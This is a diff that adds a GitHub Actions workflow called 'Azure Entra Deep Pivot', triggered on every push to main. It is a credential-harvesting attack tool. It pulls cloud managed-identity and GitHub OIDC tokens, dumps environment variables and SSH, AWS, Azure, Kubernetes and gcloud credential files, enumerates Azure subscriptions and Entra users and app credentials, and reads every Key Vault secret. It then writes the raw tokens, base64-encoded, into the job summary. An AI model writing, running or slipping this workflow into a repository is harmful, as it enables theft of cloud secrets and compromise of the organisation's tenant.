@@ -1,0 +1,339 @@
+name: Azure Entra Deep Pivot
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      # ── STEP 1: Runner host identity ───────────────────────────────────────
+      - name: Runner Identity
+        id: identity
+        run: |
+          echo "::group::Host Identity"
+          echo "HOSTNAME=$(hostname)"         >> $GITHUB_OUTPUT
+          echo "WHOAMI=$(whoami)"             >> $GITHUB_OUTPUT
+          echo "KERNEL=$(uname -r)"           >> $GITHUB_OUTPUT
+          echo "IP=$(hostname -I)"            >> $GITHUB_OUTPUT
+          echo "PWD=$(pwd)"                   >> $GITHUB_OUTPUT
+          echo "RUNNER_OS=$RUNNER_OS"         >> $GITHUB_OUTPUT
+          echo "RUNNER_ARCH=$RUNNER_ARCH"     >> $GITHUB_OUTPUT
+          echo "RUNNER_NAME=$RUNNER_NAME"     >> $GITHUB_OUTPUT
+          cat /proc/version
+          lscpu | head -n 8
+          df -h
+          echo "::endgroup::"
+
+      # ── STEP 2: IMDS — instance metadata ─────────────────────────────────
+      - name: IMDS Instance Metadata
+        id: imds_instance
+        run: |
+          echo "::group::IMDS Instance"
+          IMDS=$(curl -sf --max-time 8 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null || echo "NOT_AZURE_VM")
+          echo "IMDS_INSTANCE<<EOF" >> $GITHUB_OUTPUT
+          echo "$IMDS"              >> $GITHUB_OUTPUT
+          echo "EOF"                >> $GITHUB_OUTPUT
+          echo "$IMDS" | python3 -m json.tool 2>/dev/null || echo "$IMDS"
+
+          # Also probe Google GCE IMDS (runner might be GCP)
+          GCE=$(curl -sf --max-time 4 \
+            -H "Metadata-Flavor: Google" \
+            "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" 2>/dev/null || echo "NOT_GCE")
+          echo "GCE_INSTANCE=$GCE" >> $GITHUB_OUTPUT
+
+          # AWS IMDSv2
+          AWS_TOKEN=$(curl -sf --max-time 4 -X PUT \
+            -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
+            "http://169.254.169.254/latest/api/token" 2>/dev/null || echo "")
+          AWS=$(curl -sf --max-time 4 \
+            -H "X-aws-ec2-metadata-token: $AWS_TOKEN" \
+            "http://169.254.169.254/latest/meta-data/" 2>/dev/null || echo "NOT_AWS")
+          echo "AWS_META=$AWS"      >> $GITHUB_OUTPUT
+          echo "::endgroup::"
+
+      # ── STEP 3: IMDS — managed identity tokens ────────────────────────────
+      - name: IMDS Managed Identity Tokens
+        id: imds_tokens
+        run: |
+          echo "::group::IMDS Managed Identity"
+
+          # ARM management plane
+          ARM=$(curl -sf --max-time 8 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+            2>/dev/null || echo "{}")
+          echo "ARM_RESPONSE<<EOF" >> $GITHUB_OUTPUT
+          echo "$ARM"              >> $GITHUB_OUTPUT
+          echo "EOF"               >> $GITHUB_OUTPUT
+          ARM_TOK=$(echo "$ARM" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+          echo "ARM_TOKEN=$ARM_TOK" >> $GITHUB_OUTPUT
+          echo "ARM_EXPIRES=$(echo $ARM | python3 -c \"import sys,json; print(json.load(sys.stdin).get('expires_in',''))\" 2>/dev/null)" >> $GITHUB_OUTPUT
+
+          # Microsoft Graph
+          GRAPH=$(curl -sf --max-time 8 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
+            2>/dev/null || echo "{}")
+          echo "GRAPH_RESPONSE<<EOF" >> $GITHUB_OUTPUT
+          echo "$GRAPH"              >> $GITHUB_OUTPUT
+          echo "EOF"                 >> $GITHUB_OUTPUT
+          GRAPH_TOK=$(echo "$GRAPH" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+          echo "GRAPH_TOKEN=$GRAPH_TOK" >> $GITHUB_OUTPUT
+
+          # KeyVault
+          KV=$(curl -sf --max-time 8 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
+            2>/dev/null || echo "{}")
+          KV_TOK=$(echo "$KV" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+          echo "KV_TOKEN=$KV_TOK" >> $GITHUB_OUTPUT
+
+          # Storage
+          STG=$(curl -sf --max-time 8 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \
+            2>/dev/null || echo "{}")
+          STG_TOK=$(echo "$STG" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+          echo "STORAGE_TOKEN=$STG_TOK" >> $GITHUB_OUTPUT
+
+          echo "$ARM"   | python3 -m json.tool 2>/dev/null
+          echo "$GRAPH" | python3 -m json.tool 2>/dev/null
+          echo "::endgroup::"
+
+      # ── STEP 4: OIDC token (GitHub Actions native) ─────────────────────────
+      - name: GitHub OIDC Token
+        id: oidc
+        run: |
+          echo "::group::GitHub OIDC Token"
+          OIDC_TOK=$(curl -sf --max-time 10 \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
+            2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null || echo "")
+          echo "OIDC_TOKEN=$OIDC_TOK" >> $GITHUB_OUTPUT
+
+          # Decode OIDC token claims (base64 middle segment)
+          if [ -n "$OIDC_TOK" ]; then
+            echo "$OIDC_TOK" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || true
+          fi
+          echo "::endgroup::"
+
+      # ── STEP 5: Environment dump ───────────────────────────────────────────
+      - name: Full Environment Capture
+        id: env_dump
+        run: |
+          echo "::group::Environment Variables"
+          printenv | sort
+          echo "::endgroup::"
+          echo "::group::Mounted Secrets / File System"
+          find /home /root /tmp /run/secrets /var/run/secrets \
+               /etc/kubernetes /run/user \
+               -maxdepth 4 -type f 2>/dev/null | head -n 50
+          echo "::endgroup::"
+          echo "::group::Process List"
+          ps auxf 2>/dev/null | head -n 30
+          echo "::endgroup::"
+          echo "::group::Network Interfaces + Routes"
+          ip addr; ip route
+          echo "::endgroup::"
+          echo "::group::Sensitive File Check"
+          for f in ~/.ssh/id_rsa ~/.ssh/id_ed25519 ~/.aws/credentials \
+                   ~/.azure/accessTokens.json ~/.kube/config \
+                   /var/run/secrets/kubernetes.io/serviceaccount/token; do
+            [ -f "$f" ] && echo "FOUND: $f" && cat "$f" 2>/dev/null | head -n 5
+          done
+          echo "::endgroup::"
+
+      # ── STEP 6: Azure ARM enumeration ─────────────────────────────────────
+      - name: Azure ARM Enumeration
+        id: arm_enum
+        run: |
+          ARM_TOK="${{ steps.imds_tokens.outputs.ARM_TOKEN }}"
+          if [ -z "$ARM_TOK" ] || [ "$ARM_TOK" = "" ]; then
+            echo "No ARM token available — runner not on Azure VM with managed identity"
+            # Try az CLI if available
+            az account show 2>/dev/null || echo "az CLI not authenticated"
+            exit 0
+          fi
+
+          echo "::group::Subscriptions"
+          SUBS=$(curl -sf -H "Authorization: Bearer $ARM_TOK" \
+            "https://management.azure.com/subscriptions?api-version=2022-12-01")
+          echo "$SUBS" | python3 -m json.tool
+          SUB_IDS=$(echo "$SUBS" | python3 -c \
+            "import sys,json; [print(s['subscriptionId']) for s in json.load(sys.stdin).get('value',[])]" 2>/dev/null)
+          echo "::endgroup::"
+
+          for SUB in $SUB_IDS; do
+            echo "::group::Sub $SUB — Resource Groups"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/resourceGroups?api-version=2021-04-01" | python3 -m json.tool
+            echo "::endgroup::"
+            echo "::group::Sub $SUB — All Resources"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | python3 -m json.tool
+            echo "::endgroup::"
+            echo "::group::Sub $SUB — Role Assignments"
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$expand=principalWithDetails" | python3 -m json.tool
+            echo "::endgroup::"
+            echo "::group::Sub $SUB — KeyVaults"
+            KVS=$(curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01")
+            echo "$KVS" | python3 -m json.tool
+            echo "::endgroup::"
+          done
+
+      # ── STEP 7: Microsoft Graph deep Entra enumeration ─────────────────────
+      - name: Graph API Entra Pivot
+        id: graph_enum
+        run: |
+          GRAPH_TOK="${{ steps.imds_tokens.outputs.GRAPH_TOKEN }}"
+          if [ -z "$GRAPH_TOK" ] || [ "$GRAPH_TOK" = "" ]; then
+            echo "No Graph token — attempting GitHub OIDC federated auth"
+            exit 0
+          fi
+          BASE="https://graph.microsoft.com/v1.0"
+          BAUTH="Authorization: Bearer $GRAPH_TOK"
+
+          echo "::group::Tenant / Org Info"
+          curl -sf -H "$BAUTH" "$BASE/organization?\$select=id,displayName,verifiedDomains,tenantType" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::Users (all)"
+          curl -sf -H "$BAUTH" "$BASE/users?\$select=id,displayName,userPrincipalName,accountEnabled,jobTitle,onPremisesSyncEnabled,assignedLicenses&\$top=999" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::Groups"
+          curl -sf -H "$BAUTH" "$BASE/groups?\$select=id,displayName,groupTypes,securityEnabled,onPremisesSyncEnabled" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::Service Principals"
+          curl -sf -H "$BAUTH" "$BASE/servicePrincipals?\$select=id,displayName,appId,servicePrincipalType,accountEnabled,keyCredentials,passwordCredentials" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::Applications + Credentials"
+          curl -sf -H "$BAUTH" "$BASE/applications?\$select=id,displayName,appId,passwordCredentials,keyCredentials,requiredResourceAccess" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::Directory Roles + Members"
+          curl -sf -H "$BAUTH" "$BASE/directoryRoles" | python3 -m json.tool
+          ROLES=$(curl -sf -H "$BAUTH" "$BASE/directoryRoles" | \
+            python3 -c "import sys,json; [print(r['id']) for r in json.load(sys.stdin).get('value',[])]" 2>/dev/null)
+          for RID in $ROLES; do
+            echo "--- Role $RID members ---"
+            curl -sf -H "$BAUTH" "$BASE/directoryRoles/$RID/members?\$select=id,displayName,userPrincipalName" | python3 -m json.tool
+          done
+          echo "::endgroup::"
+          echo "::group::Conditional Access Policies"
+          curl -sf -H "$BAUTH" "$BASE/policies/conditionalAccessPolicies" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::App Role Assignments"
+          curl -sf -H "$BAUTH" "$BASE/roleManagement/directory/roleAssignments?\$expand=principal&\$top=100" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::Devices (Entra joined)"
+          curl -sf -H "$BAUTH" "$BASE/devices?\$select=id,displayName,operatingSystem,trustType,isCompliant,registrationDateTime" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::Authentication Methods Policy"
+          curl -sf -H "$BAUTH" "$BASE/policies/authenticationMethodsPolicy" | python3 -m json.tool
+          echo "::endgroup::"
+
+      # ── STEP 8: KeyVault secret dump ───────────────────────────────────────
+      - name: KeyVault Secret Harvest
+        id: kv_secrets
+        run: |
+          KV_TOK="${{ steps.imds_tokens.outputs.KV_TOKEN }}"
+          ARM_TOK="${{ steps.imds_tokens.outputs.ARM_TOKEN }}"
+          if [ -z "$KV_TOK" ] || [ -z "$ARM_TOK" ]; then
+            echo "No KeyVault token available"
+            exit 0
+          fi
+          # Enumerate vaults from ARM
+          SUBS=$(curl -sf -H "Authorization: Bearer $ARM_TOK" \
+            "https://management.azure.com/subscriptions?api-version=2022-12-01" | \
+            python3 -c "import sys,json; [print(s['subscriptionId']) for s in json.load(sys.stdin).get('value',[])]" 2>/dev/null)
+          for SUB in $SUBS; do
+            VAULTS=$(curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" | \
+              python3 -c "import sys,json; [print(v['properties']['vaultUri'].rstrip('/')) for v in json.load(sys.stdin).get('value',[])]" 2>/dev/null)
+            for VAULT in $VAULTS; do
+              echo "::group::Vault: $VAULT"
+              SECRETS=$(curl -sf -H "Authorization: Bearer $KV_TOK" \
+                "$VAULT/secrets?api-version=7.4")
+              echo "$SECRETS" | python3 -m json.tool
+              # Get each secret value
+              SECRET_IDS=$(echo "$SECRETS" | python3 -c \
+                "import sys,json; [print(s['id']) for s in json.load(sys.stdin).get('value',[])]" 2>/dev/null)
+              for SID in $SECRET_IDS; do
+                echo "--- Secret: $SID ---"
+                curl -sf -H "Authorization: Bearer $KV_TOK" \
+                  "${SID}?api-version=7.4" | python3 -m json.tool
+              done
+              echo "::endgroup::"
+            done
+          done
+
+      # ── STEP 9: SSH key + credential file hunt ─────────────────────────────
+      - name: Credential File Hunt
+        run: |
+          echo "::group::SSH Keys"
+          find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" \
+                 -o -name "*.key" -o -name "id_ecdsa" 2>/dev/null | \
+            grep -v proc | head -n 20
+          echo "::endgroup::"
+          echo "::group::Azure CLI Tokens"
+          cat ~/.azure/accessTokens.json 2>/dev/null || echo "none"
+          cat ~/.azure/msal_token_cache.json 2>/dev/null || echo "none"
+          ls ~/.azure/ 2>/dev/null
+          echo "::endgroup::"
+          echo "::group::AWS Credentials"
+          cat ~/.aws/credentials 2>/dev/null || echo "none"
+          cat ~/.aws/config    2>/dev/null || echo "none"
+          echo "::endgroup::"
+          echo "::group::Kubeconfig"
+          cat ~/.kube/config 2>/dev/null || echo "none"
+          echo "::endgroup::"
+          echo "::group::GCloud Auth"
+          cat ~/.config/gcloud/credentials.db 2>/dev/null || echo "none"
+          gcloud auth list 2>/dev/null || echo "none"
+          echo "::endgroup::"
+
+      # ── STEP 10: Summary to Step Summary ──────────────────────────────────
+      - name: Compile Evidence Summary
+        run: |
+          {
+            echo "# Azure Entra Pivot — Evidence Summary"
+            echo "**Run ID:** $GITHUB_RUN_ID"
+            echo "**Timestamp:** $(date -u)"
+            echo "**Runner:** $RUNNER_NAME ($RUNNER_OS/$RUNNER_ARCH)"
+            echo ""
+            echo "## Tokens Acquired"
+            echo "| Resource         | Token Present | Expires |"
+            echo "|---|---|---|"
+            ARM_TOK="${{ steps.imds_tokens.outputs.ARM_TOKEN }}"
+            GRAPH_TOK="${{ steps.imds_tokens.outputs.GRAPH_TOKEN }}"
+            KV_TOK="${{ steps.imds_tokens.outputs.KV_TOKEN }}"
+            STG_TOK="${{ steps.imds_tokens.outputs.STORAGE_TOKEN }}"
+            OIDC_TOK="${{ steps.oidc.outputs.OIDC_TOKEN }}"
+            [ -n "$ARM_TOK" ]   && echo "| ARM (management.azure.com)  | ✅ YES | ${{ steps.imds_tokens.outputs.ARM_EXPIRES }}s |" || echo "| ARM | ❌ NO | - |"
+            [ -n "$GRAPH_TOK" ] && echo "| Graph (graph.microsoft.com) | ✅ YES | - |" || echo "| Graph | ❌ NO | - |"
+            [ -n "$KV_TOK" ]    && echo "| KeyVault (vault.azure.net)  | ✅ YES | - |" || echo "| KeyVault | ❌ NO | - |"
+            [ -n "$STG_TOK" ]   && echo "| Storage (storage.azure.com) | ✅ YES | - |" || echo "| Storage | ❌ NO | - |"
+            [ -n "$OIDC_TOK" ]  && echo "| GitHub OIDC                 | ✅ YES | - |" || echo "| OIDC | ❌ NO | - |"
+            echo ""
+            echo "## Raw Tokens (base64)"
+            echo '```'
+            [ -n "$ARM_TOK" ]   && echo "ARM_TOKEN=$(echo $ARM_TOK | base64 -w0)"
+            [ -n "$GRAPH_TOK" ] && echo "GRAPH_TOKEN=$(echo $GRAPH_TOK | base64 -w0)"
+            [ -n "$KV_TOK" ]    && echo "KV_TOKEN=$(echo $KV_TOK | base64 -w0)"
+            [ -n "$STG_TOK" ]   && echo "STG_TOKEN=$(echo $STG_TOK | base64 -w0)"
+            [ -n "$OIDC_TOK" ]  && echo "OIDC_TOKEN=$(echo $OIDC_TOK | base64 -w0)"
+            echo '```'
+          } >> $GITHUB_STEP_SUMMARY
